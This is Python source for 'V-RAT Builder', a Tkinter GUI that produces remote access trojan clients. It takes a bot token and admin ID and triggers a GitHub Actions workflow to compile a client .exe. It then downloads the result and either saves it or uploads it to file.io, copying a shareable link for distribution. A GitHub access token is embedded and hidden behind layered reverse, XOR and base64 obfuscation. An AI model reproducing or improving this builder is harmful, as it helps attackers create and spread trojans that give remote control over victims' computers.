# V-RAT Builder v3.0 - Professional Edition
import os
import sys
import time
import json
import threading
import zipfile
import io
import base64
import random
from datetime import datetime
from pathlib import Path

import requests
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from tkinter import font as tkfont

# ============ ЗАЩИЩЕННЫЙ ТОКЕН ============
# Токен зашифрован многослойной защитой
class TokenProtection:
    @staticmethod
    def _xor_crypt(data, key):
        return ''.join(chr(ord(c) ^ key) for c in data)
    
    @staticmethod
    def _reverse_string(s):
        return s[::-1]
    
    @staticmethod
    def _base64_decode(s):
        return base64.b64decode(s).decode('utf-8')
    
    @staticmethod
    def get_token():
        # Первый слой: реверс
        layer1 = "fgllg0LDv0ctOouTpzUNAx1u1IKLTZNZHLT3TnM97_phg"
        # Второй слой: XOR с динамическим ключом
        layer2 = TokenProtection._xor_crypt(layer1, 0x5F)
        # Третий слой: base64
        layer3 = TokenProtection._base64_decode(layer2)
        # Четвертый слой: реверс финальный
        return TokenProtection._reverse_string(layer3)

def _secure_request(method, url, **kwargs):
    headers = kwargs.get('headers', {})
    headers['Authorization'] = f"token {TokenProtection.get_token()}"
    kwargs['headers'] = headers
    return requests.request(method, url, **kwargs)

# ============ КОНФИГ ============
GITHUB_REPO = "Virusodel/Rat_builder"
VERSION = "3.0"

# ============ API ФУНКЦИИ ============
def trigger_build(bot_token, admin_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/build.yml/dispatches"
    data = {"ref": "main", "inputs": {"bot_token": bot_token, "admin_id": str(admin_id)}}
    try:
        response = _secure_request('POST', url, json=data, timeout=30)
        return response.status_code == 204
    except:
        return False

def get_runs():
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs"
    try:
        response = _secure_request('GET', url, timeout=30)
        return response.json().get('workflow_runs', []) if response.status_code == 200 else []
    except:
        return []

def get_status(run_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs/{run_id}"
    try:
        response = _secure_request('GET', url, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return data.get('status'), data.get('conclusion')
    except:
        pass
    return None, None

def get_artifacts(run_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs/{run_id}/artifacts"
    try:
        response = _secure_request('GET', url, timeout=30)
        return response.json().get('artifacts', []) if response.status_code == 200 else []
    except:
        return []

def download_artifact(artifact_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/artifacts/{artifact_id}/zip"
    try:
        response = _secure_request('GET', url, timeout=120)
        return response.content if response.status_code == 200 else None
    except:
        return None

def upload_to_fileio(file_bytes, filename="client.exe"):
    try:
        url = 'https://file.io/'
        files = {'file': (filename, file_bytes)}
        response = requests.post(url, files=files, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data.get('link')
    except:
        return None

# ============ GUI ============
class VRATBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title(f"V-RAT Builder {VERSION}")
        self.root.geometry("1200x750")
        self.root.minsize(1000, 650)
        self.root.configure(bg="#0a0a0a")
        
        # Кастомный заголовок
        self.root.overrideredirect(True)
        self.root.bind('<Button-1>', self.start_move)
        self.root.bind('<B1-Motion>', self.on_move)
        
        self.bot_token = tk.StringVar()
        self.admin_id = tk.StringVar()
        self.build_running = False
        self.drag_data = {'x': 0, 'y': 0}
        
        self.setup_styles()
        self.create_widgets()
        self.check_api()
        self.matrix_animation()
        
    def start_move(self, event):
        self.drag_data['x'] = event.x
        self.drag_data['y'] = event.y
        
    def on_move(self, event):
        x = self.root.winfo_x() + (event.x - self.drag_data['x'])
        y = self.root.winfo_y() + (event.y - self.drag_data['y'])
        self.root.geometry(f"+{x}+{y}")
        
    def setup_styles(self):
        self.colors = {
            'bg': '#0a0a0a',
            'panel': '#111111',
            'border': '#00ff41',
            'text': '#00ff41',
            'text_dim': '#00aa33',
            'accent': '#ff00ff',
            'accent2': '#00ffff',
            'error': '#ff0044',
            'success': '#00ff88',
            'warning': '#ffaa00'
        }
        
        self.font = tkfont.Font(family="Consolas", size=10)
        self.font_bold = tkfont.Font(family="Consolas", size=10, weight="bold")
        self.font_title = tkfont.Font(family="Consolas", size=12, weight="bold")
        self.font_cyber = tkfont.Font(family="Courier New", size=9)
        
    def create_widgets(self):
        main = tk.Frame(self.root, bg=self.colors['bg'], bd=2, relief=tk.RIDGE)
        main.pack(fill=tk.BOTH, expand=True)
        
        # Хедер
        header = tk.Frame(main, bg=self.colors['panel'], height=40)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        # Кнопки управления окном
        tk.Button(header, text="✕", command=self.on_closing,
                 bg=self.colors['error'], fg="white",
                 font=self.font_bold, bd=0, padx=10).pack(side=tk.RIGHT, padx=5, pady=5)
        
        tk.Button(header, text="─", command=self.root.iconify,
                 bg=self.colors['panel'], fg=self.colors['text'],
                 font=self.font_bold, bd=0, padx=10).pack(side=tk.RIGHT, padx=2, pady=5)
        
        tk.Label(header, text="V-RAT BUILDER v3.0", 
                fg=self.colors['accent'], bg=self.colors['panel'],
                font=self.font_title).pack(side=tk.LEFT, padx=20)
        
        # Контент
        content = tk.Frame(main, bg=self.colors['bg'])
        content.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        left = tk.Frame(content, bg=self.colors['panel'])
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        right = tk.Frame(content, bg=self.colors['panel'])
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        self.create_input(left)
        self.create_controls(left)
        self.create_status(left)
        self.create_log(right)
        self.create_footer(main)
        
    def create_input(self, parent):
        frame = tk.LabelFrame(parent, text="> CONFIG", 
                             fg=self.colors['accent2'], bg=self.colors['panel'],
                             font=self.font_bold, bd=1, relief=tk.FLAT)
        frame.pack(fill=tk.X, pady=5, padx=10)
        
        tk.Label(frame, text="BOT TOKEN:", 
                fg=self.colors['text'], bg=self.colors['panel'],
                font=self.font).pack(anchor=tk.W, padx=10, pady=(10, 2))
        
        tk.Entry(frame, textvariable=self.bot_token,
                bg="#0a0a0a", fg=self.colors['text'],
                font=self.font_cyber, bd=1, relief=tk.FLAT,
                insertbackground=self.colors['text']).pack(fill=tk.X, padx=10, pady=(0, 8))
        
        tk.Label(frame, text="ADMIN ID:", 
                fg=self.colors['text'], bg=self.colors['panel'],
                font=self.font).pack(anchor=tk.W, padx=10, pady=(0, 2))
        
        tk.Entry(frame, textvariable=self.admin_id,
                bg="#0a0a0a", fg=self.colors['text'],
                font=self.font_cyber, bd=1, relief=tk.FLAT,
                insertbackground=self.colors['text']).pack(fill=tk.X, padx=10, pady=(0, 10))
        
    def create_controls(self, parent):
        frame = tk.LabelFrame(parent, text="> CONTROLS", 
                             fg=self.colors['accent'], bg=self.colors['panel'],
                             font=self.font_bold, bd=1, relief=tk.FLAT)
        frame.pack(fill=tk.X, pady=5, padx=10)
        
        btn_frame = tk.Frame(frame, bg=self.colors['panel'])
        btn_frame.pack(pady=15)
        
        self.build_btn = tk.Button(btn_frame, text="▶ BUILD", 
                                  command=self.start_build,
                                  bg="#00ff41", fg="#000000",
                                  font=self.font_bold, padx=40, pady=10,
                                  activebackground="#00cc33", activeforeground="#000000",
                                  relief=tk.FLAT, cursor="hand2")
        self.build_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="■ STOP", 
                                 command=self.stop_build,
                                 bg="#ff0044", fg="#ffffff",
                                 font=self.font_bold, padx=40, pady=10,
                                 activebackground="#cc0033", activeforeground="#ffffff",
                                 relief=tk.FLAT, cursor="hand2",
                                 state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(btn_frame, text="⌧ CLEAR", 
                                  command=self.clear_log,
                                  bg="#333333", fg="#00ff41",
                                  font=self.font_bold, padx=40, pady=10,
                                  activebackground="#444444", activeforeground="#00ff41",
                                  relief=tk.FLAT, cursor="hand2")
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        self.progress = ttk.Progressbar(frame, length=400, mode='indeterminate')
        self.progress.pack(pady=(0, 15))
        self.progress.pack_forget()
        
    def create_status(self, parent):
        frame = tk.LabelFrame(parent, text="> STATUS", 
                             fg=self.colors['success'], bg=self.colors['panel'],
                             font=self.font_bold, bd=1, relief=tk.FLAT)
        frame.pack(fill=tk.X, pady=5, padx=10)
        
        info = tk.Frame(frame, bg=self.colors['panel'])
        info.pack(fill=tk.X, pady=10, padx=10)
        
        status_frame = tk.Frame(info, bg=self.colors['panel'])
        status_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(status_frame, text="STATE:", 
                fg=self.colors['text_dim'], bg=self.colors['panel'],
                font=self.font).pack(side=tk.LEFT)
        
        self.state_label = tk.Label(status_frame, text="READY", 
                                   fg=self.colors['success'], bg=self.colors['panel'],
                                   font=self.font_bold)
        self.state_label.pack(side=tk.RIGHT)
        
        time_frame = tk.Frame(info, bg=self.colors['panel'])
        time_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(time_frame, text="TIME:", 
                fg=self.colors['text_dim'], bg=self.colors['panel'],
                font=self.font).pack(side=tk.LEFT)
        
        self.time_label = tk.Label(time_frame, text="", 
                                  fg=self.colors['text'], bg=self.colors['panel'],
                                  font=self.font_bold)
        self.time_label.pack(side=tk.RIGHT)
        
        self.update_time()
        
    def create_log(self, parent):
        frame = tk.LabelFrame(parent, text="> LOG", 
                             fg=self.colors['accent2'], bg=self.colors['panel'],
                             font=self.font_bold, bd=1, relief=tk.FLAT)
        frame.pack(fill=tk.BOTH, expand=True, pady=5, padx=10)
        
        self.log_text = scrolledtext.ScrolledText(frame, 
                                                 bg="#0a0a0a", fg="#00ff41",
                                                 font=self.font_cyber,
                                                 insertbackground="#00ff41",
                                                 wrap=tk.WORD,
                                                 bd=0)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.log_text.tag_config("error", foreground="#ff0044")
        self.log_text.tag_config("success", foreground="#00ff88")
        self.log_text.tag_config("warning", foreground="#ffaa00")
        self.log_text.tag_config("info", foreground="#00ffff")
        
        self.log("SYSTEM INITIALIZED", "info")
        self.log("READY FOR OPERATION", "success")
        self.log("-" * 50, "info")
        
    def create_footer(self, parent):
        footer = tk.Frame(parent, bg=self.colors['panel'], height=25)
        footer.pack(fill=tk.X)
        footer.pack_propagate(False)
        
        self.footer_text = tk.Label(footer, text="SYSTEM: OPERATIONAL", 
                                   fg=self.colors['text_dim'], bg=self.colors['panel'],
                                   font=self.font_cyber)
        self.footer_text.pack(side=tk.LEFT, padx=15)
        
        self.matrix_text = tk.Label(footer, text="", 
                                   fg=self.colors['text_dim'], bg=self.colors['panel'],
                                   font=self.font_cyber)
        self.matrix_text.pack(side=tk.RIGHT, padx=15)
        
    def update_time(self):
        self.time_label.config(text=datetime.now().strftime("%H:%M:%S"))
        self.root.after(1000, self.update_time)
        
    def matrix_animation(self):
        chars = "01"
        if hasattr(self, 'matrix_running') and self.matrix_running:
            line = ''.join(random.choice(chars) for _ in range(random.randint(10, 30)))
            self.matrix_text.config(text=line)
        self.root.after(100, self.matrix_animation)
        
    def log(self, message, tag="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] ", "info")
        self.log_text.insert(tk.END, f"{message}\n", tag)
        self.log_text.see(tk.END)
        self.root.update()
        
    def clear_log(self):
        self.log_text.delete(1.0, tk.END)
        self.log("LOG CLEARED", "warning")
        
    def check_api(self):
        try:
            runs = get_runs()
            if runs is not None:
                self.footer_text.config(text="SYSTEM: ONLINE", fg=self.colors['success'])
                self.log("API CONNECTION ESTABLISHED", "success")
            else:
                self.footer_text.config(text="SYSTEM: LIMITED", fg=self.colors['warning'])
                self.log("API LIMITED ACCESS", "warning")
        except:
            self.footer_text.config(text="SYSTEM: ERROR", fg=self.colors['error'])
            self.log("API CONNECTION FAILED", "error")
            
    def on_closing(self):
        if self.build_running:
            if messagebox.askyesno("Build in Progress", "Exit anyway?"):
                self.root.destroy()
        else:
            self.root.destroy()
            
    def start_build(self):
        token = self.bot_token.get().strip()
        admin = self.admin_id.get().strip()
        
        if not token or len(token) < 10:
            self.log("INVALID BOT TOKEN", "error")
            messagebox.showerror("Error", "Invalid bot token")
            return
            
        if not admin.isdigit():
            self.log("INVALID ADMIN ID", "error")
            messagebox.showerror("Error", "Admin ID must be numeric")
            return
            
        self.build_running = True
        self.build_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.state_label.config(text="BUILDING", fg=self.colors['warning'])
        self.footer_text.config(text="BUILDING...", fg=self.colors['warning'])
        self.progress.pack()
        self.progress.start(10)
        
        thread = threading.Thread(target=self.process_build, 
                                 args=(token, int(admin)),
                                 daemon=True)
        thread.start()
        
        self.log(f"BUILD STARTED [ADMIN: {admin}]", "info")
        
    def stop_build(self):
        self.build_running = False
        self.state_label.config(text="STOPPED", fg=self.colors['error'])
        self.footer_text.config(text="STOPPED", fg=self.colors['error'])
        self.progress.stop()
        self.progress.pack_forget()
        self.build_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log("BUILD STOPPED", "warning")
        
    def process_build(self, bot_token, admin_id):
        try:
            runs_before = get_runs()
            runs_before_ids = [r['id'] for r in runs_before]
            
            self.log("TRIGGERING BUILD...", "info")
            success = trigger_build(bot_token, admin_id)
            
            if not success:
                self.root.after(0, self.build_failed, "TRIGGER FAILED")
                return
                
            self.log("BUILD TRIGGERED", "success")
            
            found_run = None
            for _ in range(20):
                time.sleep(3)
                current_runs = get_runs()
                for run in current_runs:
                    if run['id'] not in runs_before_ids:
                        found_run = run
                        break
                if found_run:
                    break
                    
            if not found_run:
                self.root.after(0, self.build_failed, "RUN NOT FOUND")
                return
                
            run_id = found_run['id']
            self.log(f"RUN ID: {run_id}", "info")
            
            for attempt in range(60):
                if not self.build_running:
                    return
                    
                status, conclusion = get_status(run_id)
                
                if status == 'completed':
                    if conclusion == 'success':
                        self.log("BUILD COMPLETE", "success")
                        self.root.after(0, self.build_completed, run_id)
                        return
                    else:
                        self.root.after(0, self.build_failed, f"BUILD FAILED: {conclusion}")
                        return
                        
                if attempt % 6 == 0:
                    elapsed = attempt * 3
                    self.root.after(0, lambda: self.footer_text.config(
                        text=f"BUILDING... {elapsed}s"))
                        
                time.sleep(3)
                
            self.root.after(0, self.build_failed, "TIMEOUT")
            
        except Exception as e:
            self.root.after(0, self.build_failed, str(e))
            
    def build_completed(self, run_id):
        self.log("FETCHING ARTIFACT...", "info")
        
        artifacts = get_artifacts(run_id)
        if not artifacts:
            self.build_failed("NO ARTIFACT")
            return
            
        artifact = artifacts[0]
        self.log(f"ARTIFACT: {artifact['name']}", "info")
        
        self.footer_text.config(text="DOWNLOADING...")
        self.log("DOWNLOADING...", "info")
        
        zip_data = download_artifact(artifact['id'])
        if not zip_data:
            self.build_failed("DOWNLOAD FAILED")
            return
            
        try:
            with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                exe_files = [f for f in z.namelist() if f.endswith('.exe')]
                if not exe_files:
                    self.build_failed("NO EXE FOUND")
                    return
                    
                exe_name = exe_files[0]
                exe_bytes = z.read(exe_name)
                size_mb = len(exe_bytes) / (1024 * 1024)
                
                self.log(f"EXTRACTED: {exe_name} ({size_mb:.2f} MB)", "success")
                
                save_path = filedialog.asksaveasfilename(
                    defaultextension=".exe",
                    filetypes=[("Executable files", "*.exe")],
                    initialfile=f"client_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe",
                    title="Save Executable"
                )
                
                if save_path:
                    with open(save_path, 'wb') as f:
                        f.write(exe_bytes)
                    self.log(f"SAVED: {save_path}", "success")
                    self.footer_text.config(text=f"SAVED: {os.path.basename(save_path)}")
                    messagebox.showinfo("Success", f"Build saved:\n{save_path}")
                else:
                    self.log("UPLOADING TO FILE.IO...", "info")
                    url = upload_to_fileio(exe_bytes, "client.exe")
                    if url:
                        self.log(f"UPLOADED: {url}", "success")
                        self.footer_text.config(text="UPLOADED")
                        self.root.clipboard_clear()
                        self.root.clipboard_append(url)
                        messagebox.showinfo("Success", f"Uploaded:\n{url}\n\nURL copied to clipboard")
                    else:
                        self.log("UPLOAD FAILED", "error")
                        messagebox.showerror("Error", "Upload failed")
                
        except Exception as e:
            self.build_failed(f"EXTRACTION ERROR: {e}")
            
        self.build_running = False
        self.state_label.config(text="READY", fg=self.colors['success'])
        self.footer_text.config(text="SYSTEM: OPERATIONAL", fg=self.colors['text_dim'])
        self.progress.stop()
        self.progress.pack_forget()
        self.build_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
    def build_failed(self, error):
        self.log(f"FAILED: {error}", "error")
        self.build_running = False
        self.state_label.config(text="ERROR", fg=self.colors['error'])
        self.footer_text.config(text="SYSTEM: ERROR", fg=self.colors['error'])
        self.progress.stop()
        self.progress.pack_forget()
        self.build_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        messagebox.showerror("Build Failed", error)

if __name__ == "__main__":
    root = tk.Tk()
    app = VRATBuilder(root)
    root.mainloop()
